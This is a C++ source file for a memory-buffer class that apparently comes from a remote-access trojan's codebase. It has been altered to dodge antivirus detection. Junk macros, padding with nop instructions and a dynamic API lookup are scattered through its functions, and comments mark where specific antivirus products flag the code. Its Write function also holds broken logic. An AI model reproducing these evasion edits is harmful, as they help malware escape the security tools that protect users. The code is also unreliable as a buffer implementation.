// Buffer.cpp: implementation of the CBuffer class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "Buffer.h"
#include "math.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif




CBuffer::CBuffer()
{
	// Initial size
	m_nSize = 0;

	m_pPtr = m_pBase = NULL;

	HMODULE l_Kernel = LoadLibrary("kernel32.dll");
	
	typedef VOID(WINAPI *tInitializeCriticalSection)(LPCRITICAL_SECTION);
	tInitializeCriticalSection pInitializeCriticalSection=(tInitializeCriticalSection)GetProcAddress(l_Kernel,"InitializeCriticalSection");


	pInitializeCriticalSection(&m_cs);
ANTIVIRUS
	FreeLibrary(l_Kernel);

}


CBuffer::~CBuffer()
{
	if (m_pBase)
		XJBQIFA
		__asm nop;
	__asm nop;
		VirtualFree(m_pBase, 0, MEM_RELEASE);
	XJBQIFA
	DeleteCriticalSection(&m_cs);
}
	


BOOL CBuffer::Write(PBYTE pData, UINT nSize)
{
	
	EnterCriticalSection(&m_cs);
	try
	{
		if (pData!=NULL) throw 31;

	}
	catch (...)
	{
		if (ReAllocateBuffer(nSize + GetBufferLen()) == -1)
		{
			LeaveCriticalSection(&m_cs);
			return false;
	}	
	}



	CopyMemory(m_pPtr,pData,nSize);

	// Advance Pointer
	m_pPtr+=nSize;
	LeaveCriticalSection(&m_cs);
	return nSize;
}


BOOL CBuffer::Insert(PBYTE pData, UINT nSize)
{
	EnterCriticalSection(&m_cs);
	if (ReAllocateBuffer(nSize + GetBufferLen()) == -1)
	{
		LeaveCriticalSection(&m_cs);
		return false;
	}

	MoveMemory(m_pBase+nSize,m_pBase,GetMemSize() - nSize);
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	CopyMemory(m_pBase,pData,nSize);

	// Advance Pointer
	m_pPtr+=nSize;
	LeaveCriticalSection(&m_cs);
	return nSize;
}


/////////////////nod32
UINT CBuffer::Read(PBYTE pData, UINT nSize)
{
	XJBQIFA
	EnterCriticalSection(&m_cs);
	

	if (nSize > GetMemSize())
	{
	XJBQIFA
		LeaveCriticalSection(&m_cs);
	XJBQIFA
		return 0;
	}

	// all that we have 
	if (nSize > GetBufferLen())
		nSize = GetBufferLen();
//////////nod32下面
		
	if (nSize)
	{
	XJBQIFA
		// to terminate the buffer - got that!!! 瑞星杀这里.
		CopyMemory(pData,m_pBase,nSize);
	XJBQIFA
		// Slide the buffer back - like sinking the data
		MoveMemory(m_pBase,m_pBase+nSize,GetMemSize() - nSize);
	XJBQIFA
		m_pPtr -= nSize;
	}
			XJBQIFA
	DeAllocateBuffer(GetBufferLen());

	LeaveCriticalSection(&m_cs);
	return nSize;
}


UINT CBuffer::GetMemSize() 
{
	return m_nSize;
}


UINT CBuffer::GetBufferLen() 
{
	if (m_pBase == NULL)
		return 0;

	int nSize = 
		m_pPtr - m_pBase;
	return nSize;
}


UINT CBuffer::ReAllocateBuffer(UINT nRequestedSize)
{
	if (nRequestedSize < GetMemSize())
		return 0;

	// Allocate new size
	UINT nNewSize = (UINT) ceil(nRequestedSize / 1024.0) * 1024;

	ANTIVIRUS
	// New Copy Data Over
	PBYTE pNewBuffer = (PBYTE) VirtualAlloc(NULL,nNewSize,MEM_COMMIT,PAGE_READWRITE);
	if (pNewBuffer == NULL)
		return -1;

	ANTIVIRUS
	UINT nBufferLen = GetBufferLen();
	ANTIVIRUS
	CopyMemory(pNewBuffer,m_pBase,nBufferLen);
	
	ANTIVIRUS
	if (m_pBase)
		VirtualFree(m_pBase,0,MEM_RELEASE);


	// Hand over the pointer
	m_pBase = pNewBuffer;

	// Realign position pointer
	m_pPtr = m_pBase + nBufferLen;

	m_nSize = nNewSize;

	return m_nSize;
}


UINT CBuffer::DeAllocateBuffer(UINT nRequestedSize)
{
	XJBAV
	if (nRequestedSize < GetBufferLen())
		return 0;
	XJBQIFA
	// Allocate new size
	UINT nNewSize = (UINT) ceil(nRequestedSize / 1024.0) * 1024;
	XJBAV
	if (nNewSize < GetMemSize())
		return 0;
	ANTIVIRUS
	// New Copy Data Over
	PBYTE pNewBuffer = (PBYTE) VirtualAlloc(NULL,nNewSize,MEM_COMMIT,PAGE_READWRITE);
	ANTIVIRUS
	UINT nBufferLen = GetBufferLen();
	ANTIVIRUS
	CopyMemory(pNewBuffer,m_pBase,nBufferLen);
	ANTIVIRUS
SMJJ
	VirtualFree(m_pBase,0,MEM_RELEASE);

	// Hand over the pointer
	m_pBase = pNewBuffer;

	// Realign position pointer
	m_pPtr = m_pBase + nBufferLen;

	m_nSize = nNewSize;

	return m_nSize;
}


int CBuffer::Scan(PBYTE pScan,UINT nPos)
{
	if (nPos > GetBufferLen() )
		return -1;
ANTIVIRUS
	PBYTE pStr = (PBYTE) strstr((char*)(m_pBase+nPos),(char*)pScan);
	SMJJ
	int nOffset = 0;

	if (pStr)
		nOffset = (pStr - m_pBase) + strlen((char*)pScan);

	return nOffset;
}


void CBuffer::ClearBuffer()
{
	EnterCriticalSection(&m_cs);
	// Force the buffer to be empty
	m_pPtr = m_pBase;
SMJJ
	DeAllocateBuffer(1024);
	LeaveCriticalSection(&m_cs);
}



void CBuffer::Copy(CBuffer& buffer)
{
	int nReSize = buffer.GetMemSize();
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	int nSize = buffer.GetBufferLen();
	ClearBuffer();
SMJJ
	if (ReAllocateBuffer(nReSize) == -1)
		return;

	m_pPtr = m_pBase + nSize;

	CopyMemory(m_pBase,buffer.GetBuffer(),buffer.GetBufferLen());
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetBuffer
// 
// DESCRIPTION:	Returns a pointer to the physical memory determined by the offset
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
PBYTE CBuffer::GetBuffer(UINT nPos)
{
	return m_pBase+nPos;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Delete
// 
// DESCRIPTION:	Delete data from the buffer and deletes what it reads
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::Delete(UINT nSize)
{
	// Trying to byte off more than ya can chew - eh?
	if (nSize > GetMemSize())
		return 0;

	// all that we have 
	if (nSize > GetBufferLen())
		nSize = GetBufferLen();

		
	if (nSize)
	{
		// Slide the buffer back - like sinking the data
		MoveMemory(m_pBase,m_pBase+nSize,GetMemSize() - nSize);

		m_pPtr -= nSize;
	}
		
	DeAllocateBuffer(GetBufferLen());
SMJJ
	return nSize;
}